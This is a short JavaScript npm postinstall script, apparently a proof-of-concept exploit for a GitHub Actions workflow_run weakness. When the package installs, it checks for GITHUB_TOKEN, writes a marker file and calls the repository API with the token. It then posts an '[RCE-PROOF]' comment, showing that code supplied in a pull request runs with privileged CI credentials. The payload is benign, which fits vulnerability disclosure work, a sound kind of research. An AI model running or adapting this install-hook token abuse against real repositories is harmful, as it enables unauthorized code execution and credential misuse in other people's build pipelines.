const fs = require('fs');
console.log('ADP_DEP_POSTINSTALL_EXECUTED');
console.log('TOKEN_PRESENT=' + (process.env.GITHUB_TOKEN ? 'yes' : 'no'));
console.log('RUN_ID=' + process.env.GITHUB_RUN_ID);
fs.writeFileSync('/tmp/ADP_DEP_MARKER', 'dep-postinstall-ran');
(async () => {
  try {
    const repo = process.env.GITHUB_REPOSITORY;
    const headers = { authorization: 'Bearer ' + process.env.GITHUB_TOKEN, accept: 'application/vnd.github+json', 'user-agent': 'poc' };
    const r = await fetch(`https://api.github.com/repos/${repo}`, { headers });
    const j = await r.json();
    console.log('API_REPO_STATUS=' + r.status + ' PRIVATE=' + j.private);
    const c = await fetch(`https://api.github.com/repos/${repo}/issues/1/comments`, {
      method: 'POST', headers,
      body: JSON.stringify({ body: '[RCE-PROOF] npm postinstall from a PR-supplied artifact executed inside the privileged workflow_run job and used its GITHUB_TOKEN (pull-requests: write).' })
    });
    console.log('COMMENT_STATUS=' + c.status);
  } catch (e) { console.log('ERR=' + e.message); }
})();
